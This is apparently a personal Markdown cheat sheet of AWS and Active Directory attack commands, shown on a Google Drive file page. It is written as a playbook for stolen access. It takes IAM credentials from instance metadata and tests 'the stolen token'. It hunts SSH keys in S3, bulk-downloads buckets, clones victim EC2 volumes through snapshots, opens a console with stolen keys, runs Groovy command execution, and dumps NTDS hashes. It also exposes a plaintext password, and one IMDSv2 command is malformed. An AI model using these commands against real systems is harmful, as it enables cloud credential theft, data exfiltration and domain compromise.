  

# Helpful tools

## AWS CLI

### AWS Shell
https://github.com/awslabs/aws-shell

```bash
sudo pip install aws-shell
```

### AWS IMDS

v1
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/Demo-overpriv-dontassign
```

[v2](https://nelson.cloud/getting-ec2-instance-metadata-using-imdsv2/)
```bash
TOKEN=`curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
&& PROF=`TOKEN=`curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
&& curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/` \
&& curl -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$PROF"
```

### AWS STS
Is the stolen token valid?

```bash
aws sts get-caller-identity
```

Can we assume roles?
```bash
aws sts assume-role <role id>
```

### AWS IAM
What permissions do we have? Are there roles we can assume?
```bash
aws iam list-roles
aws iam list-policies
aws iam list-groups
aws iam list-users

aws iam list-user-policies
aws iam list-attached-user-policies
aws iam list-groups-for-user

aws iam list-group-policies
aws iam list-attached-group-policies
```

Can we overwrite a policy? [https://bishopfox.com/blog/privilege-escalation-in-aws]
```bash
aws iam get-policy-version --ploicy-arn <arn>
```

### [AWS S3](https://docs.aws.amazon.com/cli/latest/reference/s3/)
What S3 objects are there?
```bash
aws s3 ls
```

Simple filter to extract SSH keys named "id_rsa"
```bash
aws s3 cp s3://<bucket> /tmp/ --recursive --exclude "*" --include "*id_rsa*"
```

Loop to pull all objects from a bucket (WARNING: Could cost a lot of $$$)
```bash
for s in $(aws s3 ls | cut -d' ' -f 3); do echo "$s";mkdir "$s"; cd "$s"; aws s3 sync "s3://$s" .; cd ..; echo; done;
```

### [AWS SSM](https://docs.aws.amazon.com/cli/latest/reference/ssm/)

List inventory
```bash
aws ssm get-inventory
```

Run interactive session
```bash
aws ssm start-session --target <instance-id>
```

### [AWS EC2](https://docs.aws.amazon.com/cli/latest/reference/ec2/)
list instances
```bash
aws ec2 describe-instances
```

Can also filter, such as `platform=windows`
```bash
aws ec2 describe-instances --filters '[{"Name": "platform","Values": ["windows"]}] 
```

list volumes on instance
```bash
aws ec2 describe-volumes --filter '[{"Name": "attachment.instance-id","Values": ["<instance-id>"]}]' 
```

list snapshots of a volume
```bash
aws ec2 describe-snapshots --filter '[{"Name": "volume-id","Values": ["<volume-id>"]}]'
```

[Make a snapshot of volume](https://docs.aws.amazon.com/cli/latest/reference/ec2/create-snapshot.html)
```bash
aws ec2 create-snapshot --volume-id <volume-id> --description "test snap" --region <specify region you have access to>
```

[Make volume of snapshot](https://docs.aws.amazon.com/cli/latest/reference/ec2/create-volume.html)
```bash
aws ec2 create-volume --snapshot-id <snapshot-id> --availability-zone <value>
```

[Attach volume to instance](https://docs.aws.amazon.com/cli/latest/reference/ec2/attach-volume.html)
```bash
aws ec2 attach-volume --device <value> --instance-id <value> --volume-id <value>
```

### AWS Consoler
```bash
$(./parse_token.sh example_creds.json)

aws_consoler -a $AWS_ACCESS_KEY_ID -s $AWS_SECRET_ACCESS_KEY -t $AWS_SESSION_TOKEN -R us-east-1
```

### Other AWS Tools
[AWS-Security-Tools](https://github.com/0xVariable/AWS-Security-Tools)

## Specify Proxy
```bash
http_proxy=http://127.0.0.1:8080 https_proxy=http://127.0.0.1:8080 <aws command>
```

## Groovy
pwd 2J#&#4jsPRh@rYfU
```bash
def command = '''
    ls -ltr
    cat secret
'''
def proc = ['bash', '-c', command].execute()
proc.waitFor()
println proc.text
```

## Secretsdump

```bash
/System/Volumes/Data/Users/khris/Library/Python/3.9/bin/secretsdump.py -ntds ntds.dit -sam SAM -system SYSTEM LOCAL
```

AWS-to_DA_helpfulcommands.md

Open with

 Share

[![](https://lh3.google.com/u/0/ogw/AF2bZygzLczKbHTpnXWvE2RtBQqkQV1iCmw6gQZvVnxr5Ab1nw=s32-c-mo)](https://accounts.google.com/SignOutOptions?hl=en&continue=https://drive.google.com/file/d/1P_xYkjvKXVxWadtorttQ92hpgiiRIVjd/view%3Fusp%3Dsharing&service=writely&ec=GBRAGQ)

Displaying AWS-to_DA_helpfulcommands.md.